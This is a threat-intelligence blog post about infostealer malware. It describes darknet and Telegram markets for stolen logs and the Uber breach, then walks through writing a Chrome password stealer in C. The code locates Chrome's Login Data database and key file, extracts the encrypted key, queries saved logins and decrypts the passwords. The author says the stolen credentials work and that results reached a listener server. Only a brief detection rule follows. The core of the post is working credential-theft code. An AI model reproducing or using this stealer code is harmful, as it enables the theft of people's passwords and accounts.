---
title: "Hunting for Stealers"
date: 2024-06-14
draft: false
tags: ["threat intelligence", "cybersecurity", "stealer", "malware", "reverse engineering"]
categories: ["blog"]
---

As a Threat Intelligence Analyst, part of my job involves scrolling through darknet forums and detecting potential attacks, breaches, and leaks (not the other one). One thing that always crosses my mind is how confidential data is freely posted on these forums. Most interesting one is of course stealer logs.

> A stealer is a Trojan that gathers information from a system. The most common form of stealers are those that gather logon information, like usernames and passwords, and then send the information to another system either via email or over a network.

## How do we find leaks?

It is easier than you think. You can literally get stealer logs just by visiting well-known forums, where they are displayed on the front page. However, some of the premium logs (what a fancy name) will require you to purchase them.

![Alt text](/images/stealer1.webp)

If you dive deep into the darkness, you can find that you can even get them for free (almost).
![Alt text](/images/stealer2.webp)


There is no need to mention Telegram groups. It is the go-to place for leaks.

![Alt text](/images/stealer3.webp)

## Why does it matter?

If you are familiar with Uber hack, hackers able to obtain access to the network via stolen credentials (probably stealer logs)

> “The Uber data breach began with a hacker purchasing stolen credentials belonging to an Uber employee from a dark web marketplace. An initial attempt to connect to Uber’s network with these credentials failed because the account was protected with MFA. To overcome this security obstacle, the hacker contacted the Uber employee via Whatsapp and, while pretending to be a member of Uber’s security, asked the employee to approve the MFA notifications being sent to their phone.”

![Alt text](/images/stealer4.webp)


Literally.

Let’s open one of the log files and analyze it. As we can see, it contains credentials for Discord, eBay, Spotify, etc., that work (don’t ask me how I know).

![Alt text](/images/stealer5.webp)


It is interesting, isn’t it? But how does it work? How can malware harvest our credentials that easily?

> RedLine Stealer is a malware available on underground forums for sale apparently as standalone ($100/$150 depending on the version) or also on a subscription basis ($100/month). This malware harvests information from browsers such as saved credentials, autocomplete data, and credit card information. A system inventory is also taken when running on a target machine, to include details such as the username, location data, hardware configuration, and information regarding installed security software. More recent versions of RedLine added the ability to steal cryptocurrency. FTP and IM clients are also apparently targeted by this family, and this malware has the ability to upload and download files, execute commands, and periodically send back information about the infected computer.

## How Chrome saves passwords?

The encrypted passwords are stored in a sqlite database located at:

```c
%APPDATA%..\Local\Google\Chrome\User Data\Default\Login Data
```

256 bit masterkey is stored in:

```c
C:\Users%s\AppData\Local\Google\Chrome\User Data\Local State
```


as a DPAPI secret again and each password item is then a hex encoded.

> Chrome encrypts this password using the Windows API function CryptProtectData. This function gets called in the user context of the machine and only a user with the same credentials as the user who encrypted the data can decrypt it. This encryption / decryption also must be carried out on the same machine (Microsoft, 2018).

## Writing stealer to dump passwords

We will write our stealer in C (because why not). First, we need to state where passwords and encryption keys are stored. You can get full code from my github repo.

```c
snprintf(password_path, MAX_PATH_LENGTH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", username);

char encryption_key_path[MAX_PATH_LENGTH];
snprintf(encryption_key_path, MAX_PATH_LENGTH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username);
```

In order to get encryption key we use getEncryptionKey function. This function reads an encryption key from a file specified by encryption_key_path by locating the string "encrypted_key" within the file and returns the key as a dynamically allocated string. If the file cannot be opened or memory allocation fails, it returns NULL.

```c
char* getEncryptionKey(const char* encryption_key_path) {
    FILE* encryption_key_file = fopen(encryption_key_path, "r");
    if (encryption_key_file == NULL) {
        printf("Error opening encryption_key_file: ");
        displayErrorMessage(GetLastError());
        return NULL;
    }

    char buffer[MAX_LINE_LENGTH];
    char* key = NULL;
    long offset = 0;

    while (fgets(buffer, MAX_LINE_LENGTH, encryption_key_file) != NULL) {
        char* key_start = strstr(buffer, "\"encrypted_key\":\"");
        if (key_start != NULL) {
            offset += key_start - buffer;
            fseek(encryption_key_file, offset, SEEK_SET);
            key = (char*)malloc(MAX_LINE_LENGTH);
            if (key == NULL) {
                printf("Error: Memory allocation failed.\n");
                fclose(encryption_key_file);
                return NULL;
            }
            if (fgets(key, MAX_LINE_LENGTH, encryption_key_file) == NULL) {
                printf("Error reading key value.\n");
                fclose(encryption_key_file);
                free(key);
                return NULL;
            }
            break;
        }
        offset += strlen(buffer);
    }

    fclose(encryption_key_file);
    return key;
}
```

This function decrypts a given ciphertext using AES-256-GCM, storing the decrypted data in the decrypted buffer, and prints an error message if decryption fails.

```c
void decrypt_payload(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
    unsigned long long decrypted_len;
    int result = crypto_aead_aes256gcm_decrypt(decrypted, &decrypted_len, NULL, ciphertext, ciphertext_len, NULL, 0, iv, key);
    if (result != 0) {
        printf("Decryption failed\n");
        displayErrorMessage(GetLastError());
    }
}
```

This code snippet connects to an SQLite database, retrieves login information, and attempts to decrypt the stored passwords using AES-256-GCM. If any step fails, it prints an error message and continues to the next entry.

```c
sqlite3* db;
int rc = sqlite3_open(password_path, &db);
if (rc != SQLITE_OK) {
    fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
    sqlite3_close(db);
    return 1;
}

const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
sqlite3_stmt* stmt;
rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to execute SQL query: %s\n", sqlite3_errmsg(db));
    sqlite3_close(db);
    return 1;
}

while (sqlite3_step(stmt) == SQLITE_ROW) {
    const unsigned char* originUrl = sqlite3_column_text(stmt, 0);
    const unsigned char* usernameValue = sqlite3_column_text(stmt, 1);
    const void* passwordBlob = sqlite3_column_blob(stmt, 2);
    int passwordSize = sqlite3_column_bytes(stmt, 2);

    printf("Origin URL: %s\n", originUrl);
    printf("Username: %s\n", usernameValue);

    unsigned char iv[12];
    if (passwordSize >= 15) {
        memcpy(iv, (unsigned char*)passwordBlob + 3, 12);
    } else {
        fprintf(stderr, "Password size too small to generate IV\n");
        continue;
    }

    if (passwordSize <= 15) {
        fprintf(stderr, "Password size too small\n");
        continue;
    }

    BYTE* Password = (BYTE*)malloc(passwordSize - 14);
    memcpy(Password, (unsigned char*)passwordBlob + 15, passwordSize - 15);
    Password[passwordSize - 15] = '\0';

    decrypt_payload(Password, passwordSize - 15, masterkey.pbData, iv, Password);
    printf("Decrypted password is: %s\n", Password);
}
```
After running the payload, we can see the credentials on our listener server, indicating that the operation was successful.
How we detect?

If we analyze collected logs in Splunk by writing a correlation search with event code 4663, which indicates an attempt was made to access an object related to login data, we can identify access attempts where the action is ReadData. To reduce false positives, we can further exclude Chrome from the process path.

Last Note

Pls don’t use crack programs (they are trojans with stealers in them. Nothing is free in this world.) 🙏🙏🙏